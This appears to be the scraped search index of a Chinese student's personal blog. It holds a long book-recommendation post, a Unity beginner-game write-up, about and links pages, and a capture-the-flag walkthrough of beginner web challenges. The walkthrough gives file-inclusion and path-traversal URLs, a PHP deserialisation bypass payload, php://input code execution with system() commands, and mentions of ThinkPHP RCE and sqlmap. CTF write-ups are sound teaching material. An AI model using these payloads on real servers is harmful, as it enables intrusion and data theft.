寺》三岛由纪夫\n 大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！\n下面开始讲书（排名不分先后，已过滤课内必读书目）\n推书！（文学性较强）  《活着》 【中】余华  实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。\n 《1984》 【英】乔治·奥威尔  “栗树荫下，我出卖你，你出卖我。”\n这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。\n 《动物庄园》 【英】乔治·奥威尔  “动物生而平等，但有的动物更平等一些。”\n一个预言故事，非常讽刺，一场革命的变质。\n 《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波  这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。\n我个人非常非常非常喜欢。\n 《三体系列》 【中】刘慈欣  格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。\n 《看不见的城市》 【意大利】伊塔洛·卡尔维诺  几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。\n城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。\n 《倾城之恋》 【中】张爱玲  张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。\n 《人生的智慧》 【德】叔本华  这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。\n 《金色梦乡》 【日】伊坂幸太郎  非常有电影感的描写，非常治愈的故事，但是文风还是太白开水了，可能因为这不是纯文学吧。\n 《小径分岔的花园》 【阿根廷】博尔赫斯  博尔赫斯也是作家中的作家，全球性的作家，没得诺奖是诺奖的遗憾，但是这书实在是太晦涩了，情节也让人一头雾水，适合拿来摘抄装深沉而不是看。高情商：文辞隽永，低情商：不说人话。\n 《罪与罚》 【俄】陀思妥耶夫斯基  在各个方面都达到了相当高的水平，“好书推荐”标准答案之一，无数后来者模仿他的文风，对犯罪者的描写入木三分让人怀疑陀氏是不是也杀过人（？）\n 《恶意》 【日】东野圭吾  畅销君的书这里只放一本，因为这本阅读体验最好（？），还是老问题，文风白开水，可能因为不是纯文学吧。\n 《罗生门》 【日】芥川龙之介  那个年代的日本作家的文字总是透露出一种“在癫狂的边缘”的气质，《罗生门》是一本小说集，水平参差不齐，但是忧郁中带点狂气的感觉我很喜欢。\n 《理想国》 【古希腊】柏拉图  初中看的，几个哲学比喻很经典也很有意思，这种语录体的讨论哲学的作品散发着一种理性美。\n 《挪威的森林》 【日】村上春树  村上文字有一种沉浸感，就是冥冥中有一种力量吸引着读者一直往下看，即使现在的情节让你感觉很无聊。《挪》展现了当时日本年轻人对自我社会定位与爱情的迷茫，随便找一段看都很抓人。其中大量的性描写对当时还是初中的我造成了极大的震撼。\n 《舞！舞！舞！》 【日】村上春树  高度发达的资本主义社会中个人寻找自我的一场冒险。\n 《金阁寺》 【日】三岛由纪夫  三岛美学代表，忧郁中带着狂气的经典气质，文笔极好，阅读体验很流畅。\n 《假面的告白》 【日】三岛由纪夫  带有自传性质的小说，对主角的心理描写极为深刻和露骨，比如种种有背德感的想法等等，比较阴暗。\n 《个人的体验》 【日】大江健三郎  妻子快生孩子了，主角仍在梦想着实现个人梦想：去非洲。详细描写了个人在梦想与社会期望脱节的情况下的心理活动。（浙江高考题警告）\n 《了不起的盖茨比》 【美】弗·司各特·菲茨杰拉德  又一本各种意义上的世界名著，但对我的触动不大，留给我印象最深的意象是黛西的那盏“绿灯”，我认为它象征着对一个虚幻的人的爱。盖茨比爱黛西，但这个黛西是他想象出来的，是一种象征。这个象征很复杂，需要结合各路书评理解。（但是我看的时候就是get不到点啊\n 《美丽新世界》 【英】阿道司·赫胥黎  和《1984》一样同为反乌托邦三部曲，如果说《1984》里描述的社会形式已经离我们远去，那《美丽新世界》所描述的未来则完全有可能实现，带给读者关于随着科技进步，社会形态变迁的思考。\n 《被讨厌的勇气》 【日】岸见一郎/古贺史健  精神鸦片，但架不住好用呀！！！\n最emo的时候同学推的，看完感觉好多了。\n 《潮骚》 【日】三岛由纪夫  文笔极好的爱情故事，结局竟然是好的，这年头好结局的爱情故事不多见呀。\n 《女生徒》 【日】太宰治  男作家带入女性视角写作的短篇小说集，心理活动很细腻。\n 《荒原狼》 【德】赫尔曼·黑塞  这本书我专门写过一篇文章去谈。\n 《围城》 【中】钱钟书  讽刺很漂亮，看着很乐。\n 《三重门》 【中】韩寒  对《围城》模仿痕迹极为明显，但更现代，看着更乐。\n 《红高粱家族》 【中】莫言  极为深重的历史苍桑感，乡土化的魔幻现实主义的写法。\n 《檀香刑》 【中】莫言  给莫言的文笔跪了，这书情节上没啥厉害的，描写太厉害了，我个人不太喜欢看大段描写，但是莫言这书里的描写太强了，看着超带感。\n 《正红旗下》 【中】老舍  老舍先生语言大师，人民艺术家，看他的文字是种享受。\n 《局外人》 【法】阿尔贝·加缪  “法庭判你死刑，哲学证你无罪。“\n文风和情节都让我很喜欢，整体传达出的这种荒诞感很契合现代人的心理。\n 《脑髓地狱》 【日】梦野久作  本来应该放在消遣类里的，但是我认为这本书的文学性同样不输上面的任何一本，这是本奇书，阅读体验很神奇，千万不要错过。\n 《伊豆的舞女》 【日】川端康成  文字描写太美了，透露出的那种细微的情感转变感染力非常非常强，可以称得上字字珠玑了。\n 《静静的顿河》 【前苏联】肖洛霍夫  历史沧桑感极强，但是太长了，不建议花时间去看（那我当初是怎么看完的，疑惑）。\n 《安娜·卡列尼娜》 【俄】列夫·托尔斯泰  名字记不住，印象不深了。\n 《霍乱时期的爱情》 【哥伦比亚】加西亚·马尔克斯  正在看，看完写书评。大家不要觉得马尔克斯的作品都很绕啊QAQ\n这本情节很清楚，人名很好记，《百年孤独》人名绕完全是作者故意的。\n 《百年孤独》 【哥伦比亚】加西亚·马尔克斯  这位更是重量级。看到一半没看完，阅历不太够，强行看完得不偿失。\n 《银河铁道之夜》 【日】宫泽贤治  个人内心童话top1，既梦幻又带着淡淡的哀伤，最喜欢这种。\n 《春风沉醉的晚上》 【中】郁达夫  我也不知道我为啥会看这本书，看完感觉还不错，很有代入感。\n推书！（人文社科类）  《春秋大义》 【中】熊逸  讲清楚了春秋时儒家的思维逻辑，重点是语言很通俗易懂，幽默诙谐。\n 《西西弗神话》 【法】阿尔贝·加缪  对死亡的哲学探讨，感兴趣的可以看看。\n 《史蒂夫·乔布斯传》 【美】沃尔特·艾萨克森  乔帮主的传奇人生。\n 《异类》 【加拿大】马尔科姆·格拉德威尔  为读者指出了成功之路的方向，但怎样把握这份机遇，每个人都需要仔细思考，毕竟，不同人拥有不同的机遇。\n成功学经典作品，但对现实指导意义有限。\n这种书一时半会很难想起来QAQ\n推书！（散文杂文类）  《文化苦旅》 【中】余秋雨  看完初中作文拿高分。\n 《鲁迅全集》 【中】鲁迅  以笔为刀，思想深度高。\n 《精神明亮的人》 【中】王开岭  能让人叹息的散文，看起来思想很深刻，看完高中作文拿高分。\n 《遥远的向日葵地》 【中】李娟  文字美，不造作，看完觉得我上我也行，实际上功力深厚。\n 《一只特立独行的猪》《沉默的大多数》《我的精神家园》 【中】王小波  幽默而有深度，我很喜欢。\n推书！（消遣类） 这里的书作者一般都还健在了2333\n一般都是推理小说了（）\n 《向日葵不开的夏天》 【日】道尾秀介  刺激的叙述性诡计。\n 《解忧杂货店》 【日】东野圭吾  治愈小故事。\n 《ZOO》 【日】乙一  好看，治愈小故事+致郁小故事的一本短篇小说合集。\n 《彩虹牙刷》 【日】早坂吝  黄色推理，很刺激，看过的都说好（资源比较难找）。\n 《献给虚无的供物》 【日】中井英夫  好看，文学性也挺高，三岛由纪夫很喜欢。\n 《夏与冬的奏鸣曲》 【日】麻耶雄嵩  好看，结局太崩坏了，让人大跌眼镜，但我喜欢。\n总结 还有好多我看过的书我没有放上去，有可能是因为我没有想起来，也有可能是我觉得这本书水平不够。\n每个人的阅读偏好都不一样，保持阅读习惯的理由也各不相同。\n在这个浮躁的年代里，在这个人们的语言表达能力严重下降的时代里，在这个很难找到时间进行深度阅读的社会里，完整地阅读一本书是多么奢侈。我至今也没有办法解释我为什么要阅读经典，也许是为了维持廉价的优越感，也许什么也不为。\n也许对我来说，看看各个时期的作家脑子里在想啥是件很有意思的事。\n","permalink":"https://zeroy.site/articles/share-books/","summary":"前言 今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。\n评价标准 我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。\n再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子：\n 海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪\n 短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是：\n 视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹  再摘一段我很喜欢的描写：\n “刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！”\n我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。\n小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。\n我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。\n同学对着我的耳朵叙说着。\n有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。……\n我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。\n《金阁寺》三岛由纪夫\n 大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！\n下面开始讲书（排名不分先后，已过滤课内必读书目）\n推书！（文学性较强）  《活着》 【中】余华  实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。\n 《1984》 【英】乔治·奥威尔  “栗树荫下，我出卖你，你出卖我。”\n这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。\n 《动物庄园》 【英】乔治·奥威尔  “动物生而平等，但有的动物更平等一些。”\n一个预言故事，非常讽刺，一场革命的变质。\n 《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波  这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。\n我个人非常非常非常喜欢。\n 《三体系列》 【中】刘慈欣  格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。\n 《看不见的城市》 【意大利】伊塔洛·卡尔维诺  几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。\n城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。\n 《倾城之恋》 【中】张爱玲  张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。\n 《人生的智慧》 【德】叔本华  这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。","title":"分享一些看过的书"},{"content":"项目构思与简介 套壳飞机大战加上模拟网络条件不佳的情况下产生的延迟（XDU校园网直呼内行）。\n把飞机大战的壳换成了可莉发射蹦蹦炸弹打丘丘人（?\n因为担心太简单所以另外开了个极限模式把延迟调到了1000ms，给喜欢操作的人留了很高的操作空间。\n项目说明 W：向上移动 A：向左移动 S：向下移动 D：向右移动 按下鼠标：丢出炸弹\n游戏实机截图 项目技术路线 一个正常的Unity入门项目，运用到了一些Unity的基本知识。\n物体之间的碰撞需要用到刚体的技术，在此项目中为Rigidbody 2D和Box Collider 2D元件。\n刚体碰撞的代码的具体实现如下：\nprivate void OnTriggerEnter2D(Collider2D collision) { if (collision.tag.Equals(\u0026#34;Monster\u0026#34;)) { Destroy(collision.gameObject); Destroy(this.gameObject); GameObject Fa = GameObject.Find(\u0026#34;Empty\u0026#34;); Fa.SendMessage(\u0026#34;AddScore\u0026#34;, 1); } } 总结 总而言之是个非常基础的项目，了解了一下Unity2D的基本工作流。\n链接：https://pan.baidu.com/s/18Is4HDqZL97i-scP0-b-Xg 提取码：yliq \u0026ndash;来自百度网盘超级会员V3的分享\n链接：https://pan.baidu.com/s/1GXPYW85KffQoRN20MWjCtg 提取码：xqra \u0026ndash;来自百度网盘超级会员V3的分享\n","permalink":"https://zeroy.site/articles/KKLEEEE/","summary":"项目构思与简介 套壳飞机大战加上模拟网络条件不佳的情况下产生的延迟（XDU校园网直呼内行）。\n把飞机大战的壳换成了可莉发射蹦蹦炸弹打丘丘人（?\n因为担心太简单所以另外开了个极限模式把延迟调到了1000ms，给喜欢操作的人留了很高的操作空间。\n项目说明 W：向上移动 A：向左移动 S：向下移动 D：向右移动 按下鼠标：丢出炸弹\n游戏实机截图 项目技术路线 一个正常的Unity入门项目，运用到了一些Unity的基本知识。\n物体之间的碰撞需要用到刚体的技术，在此项目中为Rigidbody 2D和Box Collider 2D元件。\n刚体碰撞的代码的具体实现如下：\nprivate void OnTriggerEnter2D(Collider2D collision) { if (collision.tag.Equals(\u0026#34;Monster\u0026#34;)) { Destroy(collision.gameObject); Destroy(this.gameObject); GameObject Fa = GameObject.Find(\u0026#34;Empty\u0026#34;); Fa.SendMessage(\u0026#34;AddScore\u0026#34;, 1); } } 总结 总而言之是个非常基础的项目，了解了一下Unity2D的基本工作流。\n链接：https://pan.baidu.com/s/18Is4HDqZL97i-scP0-b-Xg 提取码：yliq \u0026ndash;来自百度网盘超级会员V3的分享\n链接：https://pan.baidu.com/s/1GXPYW85KffQoRN20MWjCtg 提取码：xqra \u0026ndash;来自百度网盘超级会员V3的分享","title":"KKLEEEE（Unity入门项目总结）"},{"content":"Wings哥哥！\n我的老博客\n果果\nFrank神\n","permalink":"https://zeroy.site/links/","summary":"Wings哥哥！\n我的老博客\n果果\nFrank神","title":"友链"},{"content":"老家浙江温州乐清市，现在在西安电子科技大学读书。\nQQ：2020150384\n博客园：https://www.cnblogs.com/zeroy\n上面这个博客记录了高中时期的OI代码。\n个人经历 2019-2021: 蒟蒻OIer\nNOIP2018 一等奖 434\nCSP-S 2019 一等奖 457\n2021-: 蒟蒻ACMer+CTFer\niEEE Xtreme rank32\nCSP-24th 289\n","permalink":"https://zeroy.site/about/","summary":"老家浙江温州乐清市，现在在西安电子科技大学读书。\nQQ：2020150384\n博客园：https://www.cnblogs.com/zeroy\n上面这个博客记录了高中时期的OI代码。\n个人经历 2019-2021: 蒟蒻OIer\nNOIP2018 一等奖 434\nCSP-S 2019 一等奖 457\n2021-: 蒟蒻ACMer+CTFer\niEEE Xtreme rank32\nCSP-24th 289","title":"关于我"},{"content":"baby_web 进去之后发现是/1.php,根据提示“初始页面”，用burpsuite截获index.php，获得flag。 知识点：网页初始页面的文件名一般为index。\nwarmup 进去之后发现一个滑稽表情，用burpsuite截获数据包后发现有个source.php，打开之后发现页面源代码。\n\u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; if (! isset($page) || !is_string($page)) {//page必须被设置且page必须是字符串，否则将被过滤  echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) {//如果page在白名单内则合法  return true; } $_page = mb_substr(//mb_substr(str,start,length)截取字符串中的一段  $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;)//查找\u0026#39;?\u0026#39;在page中首次出现的位置  );//将page问号之后的内容截掉  if (in_array($_page, $whitelist)) {//若此时的page在白名单内则合法  return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;])//_REQUEST是post和get的集合  \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;])//要求file也满足上面的要求  ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34;/\u0026gt;\u0026#34;; } 根据源代码得到提示，找到文件hint.php，得知flag在ffffllllaaaagggg这个文件里。再次进行代码审计,发现底下有个文件包包含，构造payload为： http://111.200.241.244:60683/source.php?file=source.php?./../../../../ffffllllaaaagggg 就可以得到flag。\nTraining-WWW-Robots 签到题，科普了一波robots.txt。\nPHP2 根据题目提示访问/index.phps获取提示信息：\n\u0026lt;?php if(\u0026#34;admin\u0026#34;===$_GET[id]) {//如果id全等于admin则会被过滤  echo(\u0026#34;\u0026lt;p\u0026gt;not allowed!\u0026lt;/p\u0026gt;\u0026#34;); exit(); } $_GET[id] = urldecode($_GET[id]);//id进行一次url解码 if($_GET[id] == \u0026#34;admin\u0026#34;) { echo \u0026#34;\u0026lt;p\u0026gt;Access granted!\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt;Key: xxxxxxx \u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt;Can you anthenticate to this website? 构造id=%2561dmin使之在被两次urldecode后等于admin就可获得flag。\nWeb_php_unserialize 又是一道反序列化的题。打开网页发现源代码。\n\u0026lt;?php class Demo { private $file = \u0026#39;index.php\u0026#39;; public function __construct($file) { //构造函数，赋值给file  $this-\u0026gt;file = $file; } function __destruct() { //析构函数  echo @highlight_file($this-\u0026gt;file, true); } function __wakeup() { if ($this-\u0026gt;file != \u0026#39;index.php\u0026#39;) { //the secret is in the fl4g.php  $this-\u0026gt;file = \u0026#39;index.php\u0026#39;; } } } if (isset($_GET[\u0026#39;var\u0026#39;])) { $var = base64_decode($_GET[\u0026#39;var\u0026#39;]); if (preg_match(\u0026#39;/[oc]:\\d+:/i\u0026#39;, $var)) { // /i的意思是不区分大小写  die(\u0026#39;stop hacking!\u0026#39;); } else { @unserialize($var); } } else { highlight_file(\u0026#34;index.php\u0026#34;); } ?\u0026gt;当Demo被反序列化时，wakeup函数中的内容会被执行，通过构造类中成员属性数目大于实际数目绕过。 var=O:4:\u0026quot;Demo\u0026quot;:2:{s:10:\u0026quot;\\0Demo\\0file\u0026quot;;s:8:\u0026quot;fl4g.php\u0026quot;;} 下面是对var变量的检查，用到了正则表达式，如果var符合开头o:数字的形式就会被过滤，这里采用+号过滤。 构造var=O:+4:\u0026quot;Demo\u0026quot;:2:{s:10:\u0026quot;\\0Demo\\0file\u0026quot;;s:8:\u0026quot;fl4g.php\u0026quot;;}，再进行一次base64加密，构造payload传参即可得到flag。 注意Demofile中的\\0，最好直接复制序列化之后的结果来改，不然特殊字符很容易出问题。\nphp_rce 打开以后发现是个Thinkphp V5的介绍页面，说明要利用Thinkphp框架的漏洞。查阅kali linux自带的漏洞数据库即可获得hack的方法。\n使用`searchsploit thinkphp``命令即可查询到可利用的漏洞。\n然后远程代码执行，找到flag文件。\nWeb_php_include 看题目应该是个文件包含。打开页面出一段代码。\n\u0026lt;?php show_source(__FILE__); echo $_GET[\u0026#39;hello\u0026#39;]; $page=$_GET[\u0026#39;page\u0026#39;]; while (strstr($page, \u0026#34;php://\u0026#34;)) { $page=str_replace(\u0026#34;php://\u0026#34;, \u0026#34;\u0026#34;, $page); } include($page); ?\u0026gt;阅读代码发现，题目简单过滤了\u0026quot;php://\u0026ldquo;利用php大小写不敏感的特性，构造大写的pHp://绕过过滤。 使用php://input协议，远程执行代码：\n\u0026lt;?php system(\u0026#34;ls\u0026#34;); ?\u0026gt;和\n\u0026lt;?php system(\u0026#34;cat fl4gisisish3r3.php\u0026#34;); ?\u0026gt;获取flag。\nics-06 签到。Burpsuite暴力跑字典破解。。。\nNewsCenter 注意到网站使用的Sql数据库，使用Sqlmap工具hack。 sqlmap使用教程\nNaNNaNNaNNaN-Batman 下载到一段代码：\nfunction $(){ var e=document.getElementById(\u0026#34;c\u0026#34;).value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null){ if(e.match(/c7be9/)!=null){ var t=[\u0026#34;fl\u0026#34;,\u0026#34;s_a\u0026#34;,\u0026#34;i\u0026#34;,\u0026#34;e}\u0026#34;]; var n=[\u0026#34;a\u0026#34;,\u0026#34;_h0l\u0026#34;,\u0026#34;n\u0026#34;]; var r=[\u0026#34;g{\u0026#34;,\u0026#34;e\u0026#34;,\u0026#34;_0\u0026#34;]; var i=[\u0026#34;it\u0026#39;\u0026#34;,\u0026#34;_\u0026#34;,\u0026#34;n\u0026#34;]; var s=[t,n,r,i]; for(var o=0;o\u0026lt;13;++o){ document.write(s[o%4][0]);s[o%4].splice(0,1) } } } } js正则表达式审计，但其实可以直接把前面判断的代码删掉，再跑一下生成flag的那段获取flag。\nunserialize3 又一道反序列化，打开页面得到代码：\nclass xctf{ public $flag = \u0026#39;111\u0026#39;; public function __wakeup(){ exit(\u0026#39;bad requests\u0026#39;); } ?code= 这题和上道反序列化题相比完全是两个级别，直接将给的代码反序列化后，绕过wake_up即可得到flag。\n","permalink":"https://zeroy.site/articles/XCTF-WEB-1/","summary":"baby_web 进去之后发现是/1.php,根据提示“初始页面”，用burpsuite截获index.php，获得flag。 知识点：网页初始页面的文件名一般为index。\nwarmup 进去之后发现一个滑稽表情，用burpsuite截获数据包后发现有个source.php，打开之后发现页面源代码。\n\u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; if (! isset($page) || !is_string($page)) {//page必须被设置且page必须是字符串，否则将被过滤  echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) {//如果page在白名单内则合法  return true; } $_page = mb_substr(//mb_substr(str,start,length)截取字符串中的一段  $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;)//查找\u0026#39;?\u0026#39;在page中首次出现的位置  );//将page问号之后的内容截掉  if (in_array($_page, $whitelist)) {//若此时的page在白名单内则合法  return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page .","title":"攻防世界web前11题WP"},{"content":"$$ Hello World! $$\n","permalink":"https://zeroy.site/articles/hello-world/","summary":"$$ Hello World! $$","title":"HelloWorld"}]